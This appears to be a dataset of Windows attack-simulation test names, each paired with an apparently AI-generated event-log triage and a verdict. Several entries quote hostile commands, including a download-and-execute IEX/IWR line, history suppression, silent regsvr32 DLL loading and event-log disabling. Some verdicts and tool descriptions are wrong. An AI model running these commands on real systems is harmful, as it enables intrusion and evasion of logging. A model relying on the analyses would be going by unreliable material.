   - The presence of benign processes like `MicrosoftEdgeUpdate.exe`, `svchost.exe`, `WmiPrvSE.exe` operating with SYSTEM integrity is usual for background operations and doesn't inherently indicate malicious activity.

3. **PowerShell Log:**
   -**Event ID 600 and 403** further validate the malicious PowerShell script execution. The script sourced from an external URL is a red flag for payload downloads or further malicious actions.
   - The script aims to download, invoke specific macros, and attempts to clear logs, which is a typical behavior of a malicious actor trying to cover trails.

### Assessment:
- The security logs show standard system operations with elevated privileges; however, the PowerShell logs reveal potentially malicious activities.
- The use of PowerShell to execute scripts from an external site is a typical method used in cyber attacks to download and execute malicious code locally, signifying unauthorized actions.
- Therefore, the activity surrounding PowerShell execution is clearly **MALICIOUS**.

## Resolution:
- **MALICIOUS:** The logs contain activity that clearly indicates malicious behavior, specifically through the PowerShell command execution attempting to download and run a potentially harmful script from an external source.

### Guidance:
- **Immediate Steps:**
  - Block the external IP or domain in your network firewall to prevent further downloads.
  - Investigate and quarantine the host to prevent further spread of potential infection.
  - Assess whether the script was successfully executed and the extent of its impact.
  
- **Long-Term Actions:**
  - Implement additional security controls for PowerShell usage, such as constrained language mode or application whitelisting.
  - Employ network monitoring for early detection of similar activities.
  - Conduct a full forensic analysis of the system to identify any further compromise or persistence mechanisms.
  
- **Raise awareness** among employees regarding risky behaviors, such as disabling security features or running untrusted scripts."
Masquerading as Windows LSASS process,"Upon analyzing the provided Windows event logs, several points of interest stand out, indicating potential behavior worth further scrutiny:

1. **Repeated Credential Access Audit Failures**: 
   - Events with EventID 5379 appear frequently, indicating attempts to access credentials for `MicrosoftAccount:user=02txoixylodcstop`, but were unsuccessful (ReturnCode: 3221226021). This could be symptomatic of a misconfigured service or an application attempting to access credentials without proper privileges.
   - The frequency and repetition of these events in rapid succession might warrant a review, especially considering whether this user account should indeed be accessed by this host and whether there might be a brute-force attempt or a script creating these access patterns.

2. **Suspicious Process Execution**:
   - The PowerShell logs indicate scripts being executed with the restricted execution policy, which deviates from typical behavior. The command primitives used look like they are trying to analyze or manipulate configuration files, which is not inherently malicious but could be used in a malicious context if not properly justified.
   - There is an entry for `cmd.exe` copying itself to a new location named `lsass.exe`, which is well-known for its abuse in running unauthorized copies of interactive command shells that might mimic or replace critical system files (`lsass.exe` is the Local Security Authority Subsystem Service on Windows). This behavior is suspicious and could indicate an evasion tactic or an attempt to run a malicious executable under a guise.

3. **Execution of Sysinternals Tools**:
   - The use of `wevtutil.exe` and `conhost.exe` may indicate log manipulation attempts. It's crucial to ensure these executions were legitimate and, if possible, check for the command-line arguments they were executed with, as they could be involved in activity like event log clearing or modifications.

4. **High Privilege Level Logons**:
   - There are events showing privileged executions (EventID 4672), with many high-level privileges being assigned, including `SeDebugPrivilege`, which can be used to bypass typical security mechanisms. Ensuring these are part of regular administrative actions is crucial.

5. **Program Execution Patterns**:
   - A series of updates and installations seem to be conducted, primarily involving Microsoft Edge updates. Though this is a normal behavior for a system keeping up to date, it should be confirmed that these installations are authorized.

**Resolution and Guidance**:

- **Resolution**: SUSPICIOUS
  - The activities described, particularly repeated credential access failures without expected results, and the specific creation of `lsass.exe` from `cmd.exe`, place this activity in the ""suspicious"" category.
  
- **Guidance**:
  - Further investigation is warranted into the origin and intent of these log entries. Verify the legitimacy and intent behind the PowerShell scripts and the re-execution of `cmd.exe`.
  - Conduct extensive credential and access management to ensure the failed access attempts are not part of a more extended lateral movement attempt.
  - Review the systems' scheduled tasks and startup scripts that could have initiated the unexpected `cmd.exe` operations.
  - Regularly update all network security controls and policies to ensure unauthorized elevations and access can be detected and prevented."
Set Custom AddToHistoryHandler to Avoid History File Logging,"After conducting a detailed analysis of the provided logs, I have identified several aspects that warrant closer inspection:

1. **Process Executions:**
   - Commonly benign processes such as `whoami.exe`, `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE` were executed by the user SERVER002\admin_test. These processes are typically harmless and used for administrative tasks or command line operations.
   - `PowerShell.exe` was executed with a command potentially designed to prevent adding certain sessions to history: `Set-PSReadLineOption -AddToHistoryHandler { return $false }`. This behavior can be suspicious as it may indicate an attempt to mask activity on the host.

2. **Microsoft Edge Updates:**
   - The logs detail numerous launch activities of `MicrosoftEdgeUpdate.exe` and related executables under the NT AUTHORITY\SYSTEM account. This behavior typically relates to legitimate software updates by the Microsoft Edge update service.
   - The presence of Edge Update processes running from temporary directories (such as `MicrosoftEdgeUpdate.exe` in `C:\\Program Files (x86)\\Microsoft\\Temp\\`) should be verified against regular update processes to ensure no anomalous behavior.

3. **User Activity:**
   - The activities observed under the user SERVER002\admin_test largely involve command-line and utility tools often used for regular system administration, such as examining user context (`whoami.exe`), and `wevtutil.exe` for event log management, which do not raise immediate alarms.

4. **Privilege Level:**
   - Various processes, including PowerShell and Edge Update processes, ran with high integrity levels or under system-level accounts, which is common for administrative actions and software updates, but it is essential to ensure all processes align with expected system behavior and update schedules.

### Assessment

- **BENIGN or SUSPICIOUS:** The activities related to software updates appear legitimate, corresponding with common update patterns, particularly those executed by Edge Update services.
- **SUSPICIOUS:** The use of PowerShell with commands preventing session history logging warrants further investigation. This behavior can be indicative of attempts to conceal malicious behavior.

### Recommended Actions:

1. **PowerShell Review:**
   - Investigate the use of the command `Set-PSReadLineOption -AddToHistoryHandler`. Confirm whether this was executed by legitimate administrative processes or if there is any potentially unauthorized user activity.

2. **Review Update Processes:**
   - Validate the Microsoft Edge update processes executed from temporary folders. Ensure these align with expected software update protocols and are legitimate.

3. **User Activity Auditing:**
   - Perform an audit of SERVER002\admin_test's recent activities, focusing on any deviation from typical administrative actions or tasks that could suggest unauthorized access or misuse.

Based on the collected data and analysis, the overall resolution of the logs is **SUSPICIOUS**. While much of the activity can be considered routine, the obfuscation efforts with PowerShell and temporary path execution should be examined more thoroughly to rule out any malicious intents."
Disable Windows LogOff Button,"After conducting a detailed analysis of the provided Windows event logs, here are the findings and assessments:

1. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test` are noted. While `wevtutil` is a legitimate tool used to access event logs, repeated and sequential use could be indicative of log tampering or forensic countermeasures.
   - Commands executed with `cmd.exe` involving modifications to the Windows registry for keys like `NoLogOff` and `StartMenuLogOff` are slightly suspicious. Changes to these registry keys can be associated with persistence mechanisms in some malware or to configure user environments unchangeably.
   - Executions of `whoami.exe` and `hostname.exe` are fairly routine diagnostics to check user and computer information but could be part of reconnaissance processes if executed by an unauthorized user.
   - The presence of `wsmprovhost.exe` as a parent process indicates possible PowerShell or WMI activity. This can be benign or part of routine administrative scripts, but combined with the above points, it becomes notable.
   - Microsoft Edge Update processes are occurring, which is normal if the system is set for automatic updates, supported by the Application log indicating the service stopping.

2. **Application Logs:**
   - The log entry indicates the stopping of the `EdgeUpdate` service. This corresponds with the system's normal update behavior.

3. **Security and Other Logs:**
   - There are no entries provided from the Security, System, or PowerShell logs. It is unusual not to have any data in the Security log, which might imply logging is turned off or the logs have been tampered with.

**Assessment:**
- The registry changes via `cmd.exe` are of particular concern because such actions can be malicious.
- Frequent use of `wevtutil.exe` can indicate log tampering or an attempt to export logs silently.
- Overall, the logs hint towards potential suspicious activity, especially with the interplay of legitimate Windows utilities that could be used maliciously for persistence or information gathering.

**Resolution:**
- **SUSPICIOUS** - The activity noted does not conclusively confirm malicious intent but suggests actions atypical of benign system operations, warranting further investigation. This warrants a closer look at user `SERVER002\admin_test`, inspection for additional logging sources, and potential cross-verification with other security tools and monitoring systems.

**Guidance:**
- Recommend validating the intent of the user `SERVER002\admin_test` or verifying the credentials used for these actions.
- Investigate potential mismatches or irregularities in the advanced settings and configurations related to Windows logging.
- If possible, attempt to recover or corroborate activity with backup logs from network storage or other security tools in use within the environment."

Bypass UAC using SilentCleanup task,"Based on the provided log entries, here is a detailed analysis focusing on identifying any suspicious or anomalous activities:

1. **Usage of `wevtutil.exe` and `conhost.exe`**:
   - Several instances of `C:\\Windows\\System32\\wevtutil.exe` and `C:\\Windows\\System32\\conhost.exe` appear in the logs with the user `SERVER002\\admin_test`. `wevtutil.exe` is a legitimate Windows utility used to manage Windows event logs. Its usage can be normal in administrative contexts, but repeated invocation, especially in a short time frame, may indicate log tampering attempts.
   - `conhost.exe` is part of the Windows Console Host infrastructure. It is common to see it accompany command-line executions, such as `cmd.exe` operations.

2. **Presence of `cmd.exe` executing bat files**:
   - An instance of `cmd.exe` executing a batch file from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\data.002.bat`) is logged. Execution of scripts from temporary directories can be a sign of malicious activity, especially when bat or script files are involved, as these could be used to execute payloads or modify system configurations.

3. **WTFA: Potential Malicious Activity**:
   - The execution of `whoami.exe` and `hostname.exe` in quick succession might indicate reconnaissance activity to understand the environment and the user context under which scripts are running.

4. **Microsoft Edge Updates**:
   - There are multiple logs about `MicrosoftEdgeUpdate.exe` launching with various command arguments (e.g., `/update`, `/svc`, `/regsvc`). These activities look like legitimate software update operations for Microsoft Edge, often performed under `NT AUTHORITY\\SYSTEM`, confirming their genuine nature.

**Assessment**:
- The repeated use of `wevtutil.exe` and the execution of batch scripts from temp directories are activities of concern but hard to classify definitively without further context.
- The batch script execution, in particular, is unusual and can be flagged for deeper investigation, as such activity may be indicative of malware or unauthorized changes.
- Edge update activities appear benign as they're consistent with normal update processes.

**Resolution**: SUSPICIOUS

While there is no conclusive evidence of malicious compromise, certain activities warrant further investigation, especially the execution of batch scripts and the possible use of the `wevtutil.exe` for log manipulation. It would be prudent to verify the source and contents of the `data.002.bat` script, check for any unauthorized modifications to the system configuration, and ensure no log tampering occurred pending further investigation."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"Upon analyzing the provided Windows event logs, several points indicate potentially malicious activity. The analysis focuses on the PowerShell and Sysmon logs, as the other logs (Application, System, and Security) are empty, providing no additional context.

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Multiple PowerShell events (EventID: 600) show a suspicious command execution: `Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe`. This points towards a potentially nefarious PowerShell script designed to execute or download a file using `mshta.exe`, a legitimate Windows utility often exploited for malicious purposes.

2. **Process Execution:**
   - The Sysmon logs indicate a series of events that include the execution of PowerShell (`powershell.exe`), which aligns with the suspicious PowerShell events.
   - The `wevtutil.exe` utility, responsible for exporting logs (`epl`), is repeatedly invoked. This could suggest an attempt to cover tracks by exporting logs for tampering or investigation evasion.
   - `conhost.exe` instances are running alongside the suspicious PowerShell and `wevtutil.exe` processes, which is expected as it's a host for console windows.

3. **User Account and Privilege:**
   - The execution context is consistently under the user `SERVER002\admin_test` with a high integrity level, suggesting administrative rights. This is crucial for executing certain malicious actions and might indicate unauthorized privilege use.

4. **Timeline:**
   - All the identified suspicious and potentially malicious events happen in quick succession, indicating a scripted or automated process, commonly seen in malicious campaigns.

Execution of HTA and VBS Files using Rundll32 and URL.dll,"Upon reviewing the provided Windows event logs from various sources, a few areas of interest and potential concern have emerged. Let's go through them:

### Security Log

1. **Event ID 4616**: These are audit events indicating system time changes. These events have the ""SubjectUserName"" marked as ""LOCAL SERVICE"". It's noteworthy that such changes can be legitimate or indicative of tampering if occurred unexpectedly. However, the time change here appears minor and might be related to routine synchronization.

### System Log

1. **Windows Update Events**: There are events indicating a Windows Defender update, which is a normal and expected activity to keep antivirus definitions up-to-date.

2. **Time Synchronization Events**: Kernel-General and Time-Service logs reporting time changes aligning with the Security log. Again, this is usually routine and expected behavior for a server.

### Sysmon Log

1. **Wevtutil.exe and Conhost.exe Executions**: Multiple instances of these processes, along with user context of ""SERVER002\\admin_test"", suggest log management activities, which admin_test appears to be executing, potentially for administrative functions. The repeated execution of these processes is unusual in quick succession, but not inherently malicious without additional context.

2. **Cmd.exe Executions**: A concerning entry here is the use of `cmd.exe` to execute scripts with `rundll32.exe`. The command line involves ""OpenURL"" method and VBS script execution, indicative of potential malicious activity or attempts at remote execution or script hosting—particularly when linked with temp directory usage.

### Application Log

1. **Windows Defender Active**: An event signifies Windows Defender is enabled, which is expected for system security.

2. **Software Protection Platform**: Indicates normal process completion related to software licensing and validation.

### Assessment
From the Sysmon log, the specific `cmd.exe` execution which runs `rundll32.exe` to open URLs and executes a VBS script from a temporary directory appears suspicious. This kind of activity is often aligned with potential exploitation tactics or malware behavior, especially when utilizing temp directories and leveraging scripting languages like VBS. This suggests an attempt to execute potentially harmful activities using system-level processes usually employed in legitimate configurations.

Overall, while many events align with standard operations, the utilization of `rundll32.exe` to handle downloads and VBS scripts, particularly from a temporary location, raises a red flag indicating possible malicious activity.

### Resolution: SUSPICIOUS
Given the identified potentially concerning behavior in the processes executed (specifically the unusual use of `rundll32.exe`), the logs are marked as **SUSPICIOUS**. Further investigation is needed, including reviewing executed scripts, correlated network traffic, and potentially affected assets, to ascertain the motives and origins of the suspicious activities noted."
LOLBAS CustomShellHost to Spawn Process,"## Detailed Analysis

### Anomalous Behavior and Indicators of Compromise

Upon reviewing the log entries, several activities raise concerns and may indicate suspicious or potentially malicious behavior:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is commonly used for managing and querying event logs, which by itself can be legitimate. However, its repetitive use in quick succession, especially when it appears alongside `conhost.exe`, can suggest log manipulation or deletion if not tied to legitimate administration activity.

2. **Use of PowerShell with Suspicious Script:**
   - A PowerShell script is executed which includes commands such as creating a directory `C:\test`, copying `customshellhost.exe` from `C:\Windows\system32` to `C:\test\customshellhost.exe`, and renaming `calc.exe` to `explorer.exe`. These activities, especially the creation or use of a `customshellhost.exe`, modifying standard executables, and using PowerShell to copy and rename critical system files or potentially disguising them, are indicative of malicious behavior, such as preparation for persistence or attack staging.
  
3. **File Manipulations in System Directories:**
   - Copying executables like `customshellhost.exe` and `calc.exe` with altered or misleading names (`explorer.exe`) is a known technique that attackers use to evade detection or to establish persistence on a system by disguising the malware as legitimate system files.

4. **High Integrity Level Execution:**
   - The scripts and processes are running with a ""High"" Integrity Level, suggesting administrative privileges. Actions taken with high integrity can have a significant impact on the system, and in combination with the suspicious activities mentioned, increase the risk profile.

5. **Unusual Parent Process Chains:**
   - The parent process for PowerShell is `wsmprovhost.exe` which is typical for remote management tasks. However, given the context of the other activities, it’s crucial to confirm whether this was a legitimate administrative action.

### Assessment of the Situation

The observed behaviors, especially the PowerShell script execution that alters or masks known Windows executables, are highly suspicious and match techniques often used in adversarial activities aimed at establishing or maintaining persistence, evading defenses, or preparing for further malicious activity.

### Threats and Risks Identified

- **Risk of Persistence and Evasion:** The operations suggest attempts to install or hide potentially malicious executables within a system path, which can evade standard detection mechanisms.
  
- **Potential Credential Theft or Elevation:** Frequent access and manipulation of processes related to logs could suggest attempts to hide traces of credential theft or improper access.
  
- **Privilege Abuse:** Given the high integrity level, the user appears to have significant privileges, potentially indicating an inside threat or compromised credentials.

### Guidance on How to Proceed

1. **Immediate Containment:**
   - Isolate the affected system (Server002) to prevent any potential spread of malicious activity within the network.

2. **Thorough Forensic Analysis:**
   - Conduct a deeper forensic investigation on the server to identify any unauthorized changes to system files or registry entries.
   - Check for unauthorized user accounts or elevated privileges that might have been illicitly obtained.

3. **Review Logs:**
   - Conduct a comprehensive review of the security and system logs for earlier entries or patterns associated with these activities to track the origin or additional impact.

4. **Incident Response:**
   - Initiate an incident response process to further analyze, confirm, and respond to suspected malicious activities.

5. **User Education and Policy Review:**
   - Reinforce user awareness regarding suspicious activities and review access controls and policies around administrative privileges.

### Resolution

Based on the indicators and analysis, the log entries suggest activities potentially associated with malicious behavior. Therefore, the final resolution for this investigation is:

- **MALICIOUS** - Given the combination of persistent PowerShell scripts executing potentially harmful operations, unusual file manipulations, and use of administrative privileges without clear legitimate purposes."
InfDefaultInstall.exe .inf Execution,"Based on the detailed analysis of the provided logs, here is the assessment:

### Application Log:
- Entries related to the `edgeupdate` service indicate expected behavior tied to Microsoft Edge updates (service stopped events). No unusual activity is detected from these logs.
- The `Software Protection Platform Service` logs also seem legitimate, as they relate to routine system activities.

### Sysmon Log:
- There are multiple entries for Microsoft Edge Update activities. These entries are consistent with updater operations initiated by authorized user accounts (`NT AUTHORITY\SYSTEM`), indicating routine software update behavior.
- Logs include process creation for known Windows executables like `powershell.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`. The presence of these processes is normal under certain circumstances like system updates or software installations.
- `MicrosoftEdgeUpdate`, `TiWorker.exe`, and `TrustedInstaller.exe` are system processes related to software updates and trusted installs, and were executed by `NT AUTHORITY\SYSTEM`, which is standard behavior.

### Security Log:
- The security logs include logon events for the `SYSTEM` user with elevated privileges, including SeDebugPrivilege. These are consistent with regular system service activities and do not indicate unauthorized access.

### Observations:
- **PowerShell Executions**: While PowerShell executions are logged (EventID 5), such logs are frequent in system activity and don’t inherently suggest suspicious behavior unless accompanied by malicious scripts or uncommon command-line arguments, which are not observed here.
- **Command Line in `cmd.exe`**: Execution of `InfDefaultInstall.exe` with a `.inf` file could be benign, potentially part of a legitimate installation or configuration process. This context requires verification if the specific `.inf` file and its origin are trusted.
- **Process Consistency**: The consistent nature and source of processes are aligned with typical system updates and activities managed by Microsoft Edge’s updating process.

### Conclusion:
There are no standout indicators of malicious activity. The logs reflect typical update and system maintenance events on a Windows host. Processes were initiated by trusted system accounts and involve standard executables associated with maintenance and updates. Given the overall context, such activities are likely benign system operations.

### Resolution:
- **BENIGN**: The logs exhibit benign activity, and there are no explicit signs of compromise or malicious behavior.
- Recommendation: Continue to monitor for any new abnormal patterns or behavior that could suggest a deviation from typical system processes.

Always ensure systems are updated with the latest security patches and maintain effective logging and monitoring for any unusual activities in the future, particularly around sensitive applications."
Snake Malware Registry Blob,"Upon analyzing the log entries provided, the following observations and deductions can be made:

1. **PowerShell Activity with Suspicious Command**:
   - The Windows PowerShell log entries show a command execution involving the creation of a registry entry under `HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds` with random bytes as the value. This operation was executed by `powershell.exe`.
   - The presence of file manipulation with random byte values in a registry key, especially within system software classes, is not typical behavior for standard PowerShell usage and could indicate an attempt to manipulate file associations, possibly for malware persistence or evasion.

2. **Sysmon Logs**:
   - Executions of `whoami.exe`, `wevtutil.exe`, and repetitive calls to `conhost.exe` are generally benign since these are typical administrative tools and processes within Windows.
   - The `whoami.exe` and `conhost.exe` processes reflect typical inquiry actions that might not be associated with malicious activity, especially when executed by an administrator user.
   - `wevtutil.exe` invocations are frequent but without additional suspicious command lines provided. This utility is used for exporting and clearing event logs, which could be benign or malicious depending on context.

3. **EdgeUpdate Service**:
   - An EdgeUpdate service stopped event and a corresponding EdgeUpdate process execution. This is expected behavior for updating applications and does not inherently suggest malicious activity.

4. **Security Log**:
   - Changes in system time (`EventID 4616`) are logged. Such changes could be associated with time synchronization processes. However, without further context, this could involve interference with timestamps for evading detection.

5. **Time Services and Kernel Events**:
   - These logs depict standard time synchronization activities and system events without anomalous indications.

**Assessment**:
The most significant entry in terms of potential risk is the PowerShell command that modifies registry keys with random byte values, which is atypical and may indicate malicious intent such as registry hijacking or persistence.

**Resolution**: **SUSPICIOUS**

While much of the logged activity aligns with typical administrative actions, the specific use of PowerShell to modify registry keys with non-standard data warrants further investigation to eliminate or confirm any malicious activity.

**Guidance on How to Proceed**:
- Investigate the origin and intention behind the suspicious PowerShell command. Review the associated user `admin_test` and any scripts or tasks scheduled or executed around the time of these logs.
- Check system integrity for any unauthorized software or scripts possibly related to malware attempting persistence mechanisms.
- Conduct a full scan of the system for any known threats and review endpoint protection logs for related alerts.
- Review logs and processes related to time changes (`EventID 4616`) to corroborate or dismiss their relevance to the potential malicious PowerShell activity."
Regsvr32 Silent DLL Install Call DllRegisterServer,"Based on my analysis of the provided Windows event logs, the following suspicious or anomalous behavior was observed:

### Application Log:
- The application log entries indicate normal activities for Windows Defender and the Software Protection Platform Service. These entries are considered benign and typically represent standard operational status updates.

### Sysmon Log:
1. **Use of PowerShell**: 
   - The event log indicates the execution of `powershell.exe`, which, on its own, is not suspicious. However, PowerShell can be used maliciously if not under the control and reason of authorized scripts or administrators.

2. **Use of Command-Line Utilities**:
   - `WHOAMI.EXE`: This utility was executed, which is often used to enumerate the currently logged-in user. While this is benign when performed by legitimate administrators or scripts, it could indicate reconnaissance if executed unexpectedly.
   - `CMD.EXE` & `REGSVR32.EXE`: More concern arises with the use of `cmd.exe` launching `regsvr32.exe` to register/deregister DLLs:
     - Command line: `""cmd.exe"" /c C:\\Windows\\system32\\regsvr32.exe /s /i ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\bin\\AllTheThingsx86.dll""`.
     - The use of `regsvr32.exe` in this manner, especially with a DLL located in a user’s temporary directory, could indicate an attempt to execute a potentially malicious or unauthorized DLL, a known technique used in DLL hijacking or injection attacks.

3. **Registry Alteration Attempts**:
   - The involvement of `regsvr32.exe` implies possible attempts to alter the system registry, potentially by registering a suspicious DLL, which could modify system behavior or provide persistence for malware.

4. **Execution of `wevtutil.exe`**:
   - This utility is used to manage event logs. Multiple instances of executing `wevtutil.exe` by a non-system user (i.e., `SERVER002\\admin_test`) is somewhat unusual without context of legitimate administrative actions, and might be indicative of an attempt to clear or modify event logs as a method to conceal tracks.

5. **Process Relationships**:
   - The processes initiated by `wsmprovhost.exe` (Windows Remote Management Provider Host) suggest remote management activities. While remote management is common in server environments, reviewing who initiated these and their purpose is necessary due to their association with potentially suspicious activities like registering a DLL.

### Analysis:
Given the nature of the executions, the logs do not provide explicit indicators of malware or compromise but show a series of activities that could potentially be used in a malicious context:

- **Use of PowerShell**: This requires further examination of the associated scripts or commands to determine intent.
- **DLL Registration via `regsvr32.exe`**: Due to the use of DLLs from a temporary directory, this is a classic indication and should be investigated for any unauthorized DLLs left behind or system modifications.
- **Multiple `wevtutil.exe` Executions**: If there are no legitimate administrative reasons for these, further investigation is warranted.

### Conclusion:
Based on these observations, the activity found in the logs is classified as **SUSPICIOUS** and warrants further investigation.

### Recommendations:
1. **Review PowerShell Scripts**: Identify any scripts executed and ensure they are legitimate and necessary.
2. **Examine DLL and Temporary Files**: Check DLLs referenced and clean up the temporary files if deemed unnecessary or harmful.
3. **Audit Events with `wevtutil.exe`**: Verify if these actions are authorized by legitimate users or automated tasks.
4. **User Activity Log Review**: Conduct user activity audits to confirm actions were by legitimate users.
5. **Harden System Audits**: Enhance system monitoring and logging, especially around key utilities like PowerShell and event logs. Enable alerts for suspicious patterns.

Initiate an investigation with these focus areas to either confirm legitimate usage or mitigate potential security risks."
Add Root Certificate to CurrentUser Certificate Store,"Upon analyzing the provided event logs, the following points of interest and potentially suspicious activities have been noted:

### PowerShell Logs
1. **Network-Based PowerShell Script Execution**:
   - Numerous PowerShell logs (Event ID 600) indicate the execution of a PowerShell command using IEX (Invoke-Expression) along with IWR (Invoke-WebRequest) to fetch and execute a script from a remote URL: `https://github.com/file/file-file/raw/master/files/data.004/src/RemoteCertTrust.ps1`.
   - This behavior is highly suspicious as it involves downloading and executing a script from an external source. It is a common tactic used in PowerShell-based attacks, where an attacker attempts to execute scripts remotely to perform potentially malicious actions on the host.

### Sysmon Logs
1. **Process Creation and Execution Context**:
   - There is a process creation event (Event ID 1) showing `powershell.exe` being started with the same suspicious command line noted in the PowerShell logs.
   - The PowerShell process has high integrity level execution indicating elevated privileges which adds to the potential severity if the remote script was indeed malicious.

2. **Use of Utility Tools**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were observed under the admin_test user, which could be benign if related to normal administration but could also be leveraged for persistence or lateral movement in an attack.

### General Security Concerns:
- **Remote Execution**: The PowerShell logs suggest possible remote code execution since the script runs directly from the external source without any apparent validation or sandboxing.
- **Privilege Level**: The execution in a high integrity context with elevated privileges suggests that an attacker could potentially perform unauthorized changes or access sensitive data.

### Assessment and Risk:
Given the nature of the activities observed, it is prudent to classify these logs as **MALICIOUS**. The direct execution of a script from an unverified external source combined with elevated privileges constitutes a significant security risk.

### Guidance on How to Proceed:
1. **Isolate the Host**: If possible, isolate the affected machine `Server002` from the network to prevent further potential compromises or data exfiltration.
2. **Further Investigation**:
   - Seek to acquire the script from its source URL for analysis to identify its intent—whether it's a benign script or contains harmful instructions.
   - Check for any indicators of compromise (IOCs) such as modifications in the registry, file system, or network behavior in relation to this script.
3. **Review Administrative Activities**: Confirm if the user `admin_test` intentionally executed the PowerShell commands or if the account is compromised.
4. **Implement Security Measures**:
   - Ensure all user account activities are being logged and reviewed, and consider implementing tighter controls on PowerShell scripts and external network communications.
   - Apply security patches and updates to all systems and adjust firewall settings to block unnecessary outgoing connections, especially to unknown external repositories or locations.
5. **Report**: Communicate the findings to the security operations team and management to kick off a coordinated incident response.

In conclusion, the events indicate unauthorized and potentially harmful activity involving PowerShell script execution from a remote source, necessitating immediate security response measures."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"Upon reviewing the provided Windows event logs, several observations can be made that may indicate suspicious or anomalous activities. I will detail these observations and assess the situation based on the logs.

### Analysis:

1. **Frequent PowerShell Execution:**
   - Multiple instances of PowerShell execution are observed (`powershell.exe` in multiple events). PowerShell is a legitimate Microsoft scripting language, but it is also commonly used by attackers due to its powerful capabilities and flexibility.

2. **Suspicious PowerShell Command:**
   - The command line for PowerShell includes `Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32`. This type of command is not typical and suggests potential execution of a script or payload in a less common manner, possibly indicative of a Living Off The Land Binaries (LOLBins) technique.

3. **Repeated Conhost.exe Usage:**
   - The process `conhost.exe` is frequently executed. While `conhost.exe` is a legitimate Windows process related to console windows, its repeated activation alongside PowerShell might be employed to disguise or host command prompts or PowerShell windows in conjunction with other tasks.

4. **Usage of System Utilities:**
   - The logs show usage of several system utilities such as `whoami.exe` and `hostname.exe`, which can be used by attackers to gather information about the system and its users during reconnaissance.

5. **Execution of `wsmprovhost.exe`:**
   - Execution of `wsmprovhost.exe` is noted as a parent process. This executable is used by Windows Remote Management (WinRM) services and might be legitimate, but its contexts need further validation as it can be leveraged for malicious remote activity.
   
6. **Wevtutil.exe Execution:**
   - Wevtutil is used several times. This tool is used for managing event logs and subscriptions and could potentially be used by malicious actors to clear logs, hide traces, or extract logs for exfiltration.

7. **Microsoft Edge Installer Execution:**
   - The logs demonstrate activity related to Microsoft Edge updates and installers (`MicrosoftEdge_X64_130.0.2849.52_129.0.2792.89.exe` and `setup.exe`). These executions could be legitimate updates, but should be validated, particularly checking signatures and source.

### Assessment:

- The repeated and closely-timed execution of PowerShell with an unusual command, along with frequent conhost activities and system reconnaissance utilities, constitutes suspicious behavior. This might indicate an attempt to perform unauthorized activities using PowerShell scripts and native Windows utilities, consistent with tactics employed in cyber attacks.

### Resolution:

- **SUSPICIOUS**: While there are no concrete indicators of compromise (IOC) pointing to a known malware or explicit hostile action, the observed behavior deviates from normal operations and could suggest an ongoing or attempted compromise. Additional investigation into these activities is warranted.

### Guidance on How to Proceed:

1. **Deep Dive into PowerShell Logs:**
   - Investigate the content of PowerShell scripts executed during this session, particularly focusing on the `Invoke-ATHHTMLApplication` usage.

2. **Examine Parent Processes:**
   - Validate instances of `wsmprovhost.exe` to ensure they align with legitimate remote management actions.

3. **Correlate with Network Activity:**
   - Examine network logs to check for any unusual outbound communications that may be linked to these PowerShell commands.

4. **Check Event Log Integrity:**
   - Review event logs for any gaps or signs of alteration, particularly in relation to the usage of `wevtutil.exe`.

5. **Monitor Continuously:**
   - Employ enhanced logging and monitoring of PowerShell executions and use of system administrative tools.

6. **Conduct User Verification:**
   - Confirm the activities of the user account (e.g., `SERVER002\\admin_test`) to ensure these actions were authorized.

By conducting these additional analyses, further clarity can be reached regarding whether these activities represent a benign operational pattern or an indicator of potential compromise."
Disable Event Logging with wevtutil,"Upon reviewing the provided Windows event logs, here is a detailed analysis of the findings:

1. **Event Log Time Manipulation (Security log & System log):**
   - Events with ID 4616 from the Security log indicate a manual change in the system time by the process `svchost.exe`. This is paralleled by Kernel-General Event ID 1, suggesting time adjustments made by the same process. These changes were logged within milliseconds and seem to revert forward to backward then backward to forward times very quickly.
   - **Suspicion:** Adjustments to system time can be indicative of an attempt to hide logs or tamper with time-stamped events for nefarious purposes or errors within a time synchronization service.

2. **Privileged Account Activities (Security log):**
   - Multiple instances of Event ID 4672 reveal that the user `admin_test` was granted several high-level privileges, such as `SeDebugPrivilege` and `SeImpersonatePrivilege`. These privileges are often exploited by malicious actors to further compromise the system.
   - Logon events with Event ID 4624 highlight a network logon type (LogonType 3) for the same account, which may signify remote access.
   - **Suspicion:** While `admin_test` could be a legitimate admin account, the simultaneous granting of multiple sensitive privileges necessitates scrutiny to ensure these actions were authorized.

3. **Presence of Utility Execution (Sysmon log):**
   - Multiple executions of system utilities (`wevtutil.exe`, `cmd.exe`, `whoami.exe`) by `admin_test` are seen within a short time frame. The command `cmd.exe /c wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false` disables a Windows event log, which is suspicious behavior.
   - **Suspicion:** Disabling logging may be a strategy to cover malicious activity, indicating potential compromise.

4. **High Integrity Processes:**
   - Multiple Sysmon logs indicate high-integrity processes being executed under the context of `admin_test`. The combination of these actions suggests an attempt to gain or maintain elevated privileges on the system.
   
5. **Common System Utilities:**
   - While utilities like `wevtutil.exe`, `conhost.exe`, and `cmd.exe` are normal system processes, their misuse, especially for modifying or disabling logs, is concerning.

**Assessment:**
The patterns exhibited in the logs indicate a combination of suspicious activities:

- Time changes by `svchost.exe` and accompanying kernel events, suggesting potential time manipulation.
- Elevated privileges for `admin_test`, alongside network logon activities and the execution of potentially obfuscating commands.
- The disabling of a security-related event log which implies concealment behavior.

**Guidance:**
1. Confirm if there are any known issues or authorized tasks that required changing system time or altering event logs.
